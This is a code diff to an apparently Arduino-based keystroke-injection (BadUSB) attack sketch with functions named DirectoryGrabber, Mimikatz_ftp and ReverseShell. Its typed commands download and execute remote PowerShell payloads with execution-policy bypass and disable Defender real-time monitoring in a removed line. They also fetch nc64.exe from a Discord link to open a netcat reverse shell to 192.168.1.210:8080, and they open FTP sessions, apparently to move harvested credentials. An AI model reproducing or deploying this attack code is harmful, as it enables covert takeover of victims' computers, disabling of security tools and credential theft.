@@ -1,9 +1,10 @@
 #include <phukdlib_leonardo.h>
-#define kbd_es_es
 
 
-void RickRoll() {
-  // Wait 500ms
+void DirectoryGrabber(){
+
+  Keyboard.begin();
+/*
   delay(500);
 
   delay(2000);
@@ -12,10 +13,22 @@ void RickRoll() {
   Keyboard.releaseAll();
 
   delay(500);
-  Keyboard.print(F("powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/rr.zip';$Z=\"$env:TMP\"+'\\rr.zip';$D=\"$env:TMP\"+'\\rr';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\\ -Force;powershell $D\\rr.ps1"));
+  Keyboard.print(F("powershell -w h -NoP -NonI -ep Bypass $pl = iwr <https://www.dropbox.com/scl/fo/lk4x6oh17mnpr9o46dg6i/h?dl=1&rlkey=og3w3hytp688dt8wpz5e3hmfz> dl=1; iex $pl"));
 
   Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  // Ending stream
+  Keyboard.end();
+  */
+  delay(2000);
+  Keyboard.print(F(" - / : ; ' <  > $  & ? ! = "));
+  Keyboard.releaseAll();
+
+  // Ending stream
+  Keyboard.end();  
 }
+
 void Mimikatz_ftp() {
   delay(2000);
   Keyboard.press(KEY_LEFT_GUI);
@@ -40,7 +53,7 @@ void Mimikatz_ftp() {
   delay(3000);
   Keyboard.println("ftp");
   delay(3000);
-  Keyboard.println("open 10.1.206.174");
+  Keyboard.println("open 192.168.1.210");
   delay(10000);
   Keyboard.println("pi");
   delay(3000);
@@ -245,40 +258,31 @@ void Scanner() {
 
 void ReverseShell() {
   
-  Keyboard.begin();
-
   // Wait 500ms
   delay(500);
 
-  delay(300);
+  delay(1000);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
 
-  delay(20);
-  // --> Opens Task Manager
-  Keyboard.print(F("taskmgr"));
-
-  delay(150);
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press('f');
-  Keyboard.press('n');
-  Keyboard.releaseAll();
-
-  delay(50);
-  // --> Starts CMD
+  delay(1000);
   Keyboard.print(F("cmd"));
 
-  typeKey(KEY_TAB);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
 
-  // --> Turn On Admin Privileges
-  typeKey(' ');
+  delay(1000);
+  Keyboard.print(F("cd / & mkdir win & cd win & echo (wget 'https://cdn.discordapp.com/attachments/823520101415911464/826813046500491264/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 \n"));
 
-  // --> Run
-  typeKey(KEY_RETURN);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
 
-  delay(20);
-  Keyboard.print(F("taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell [192.168.1.210] [8080]\");"));
+  delay(3000);
+  Keyboard.print(F("START /MIN a.exe <192.168.1.210> <8080> -e cmd.exe -d & exit \n"));
+
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
 
   // Ending stream
   Keyboard.end();
